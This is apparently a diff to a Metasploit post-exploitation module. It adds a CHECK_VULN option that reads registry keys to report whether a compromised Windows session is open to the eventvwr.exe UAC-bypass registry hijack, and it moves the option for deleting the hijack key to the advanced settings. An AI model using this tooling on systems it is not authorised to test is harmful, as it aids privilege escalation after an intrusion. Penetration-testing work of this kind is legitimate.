@@ -126,8 +126,13 @@ class MetasploitModule < Msf::Post
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed (eg start notepad.exe)']),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
+                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false])
                         ], self.class)
+
+                register_advanced_options(
+                        [
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
+                        ], self.class) 
 
         end
 
@@ -256,6 +261,63 @@ end
 
 
 
+# -------------------------------------------
+# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
+# -------------------------------------------
+def ls_stage3
+
+  r=''
+  session = client
+  vuln_valu = "Default"                              # value name
+  vuln_soft = "eventvwr.exe"                         # vulnerable software name
+  vuln_hive = "HKCR\\mscfile\\shell\\open\\command"  # vulnerable hive key call (mmc.exe)
+  vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['CHECK_VULN'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set CHECK_VULN option!")
+    return nil
+  else
+    print_status("Checking target vulnerability details!")
+    Rex::sleep(1.5)
+  end
+
+    # check target registry hive/key settings
+    check_vuln_call = registry_getvaldata(vuln_hive,vuln_valu)
+    if check_vuln_call.nil? || check_vuln_call == 0
+      hive_status = "NOT FOUND"
+    else
+      hive_status = "FOUND VULN HIVE"
+    end
+
+    # check target registry hive/key settings
+    check_vuln_key = registry_getvaldata(vuln_key,vuln_valu)
+    if check_vuln_key.nil? || check_vuln_key == 0
+      key_status = "NOT FOUND"
+    else
+      key_status = "FOUND HIJACKING KEY"
+    end
+
+  print_line("")
+  print_line("")
+  Rex::sleep(1.0)
+  # display target registry settings to user... 
+  print_line("VULNERABLE_SOFT: #{vuln_soft}")
+  print_line("    STATUS     : #{hive_status}")
+  print_line("    HIVE_KEY   : #{vuln_hive}")
+  print_line("    KEY_DATA   : #{check_vuln_call}")
+  print_line("")
+  print_line("    STATUS     : #{key_status}")
+  print_line("    HIJACK_KEY : #{vuln_key}")
+  print_line("    KEY_DATA   : #{check_vuln_key}")
+  print_line("")
+  print_line("")
+end
+
+
+
+
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
@@ -306,7 +368,7 @@ def run
     client.sys.config.getprivs.each do |priv|
     end
 
- 
+
 # ------------------------------------
 # Selected settings to run
 # ------------------------------------
@@ -316,6 +378,10 @@ def run
 
       if datastore['DEL_REGKEY']
          ls_stage2
+      end
+
+      if datastore['CHECK_VULN']
+         ls_stage3
       end
    end
 end
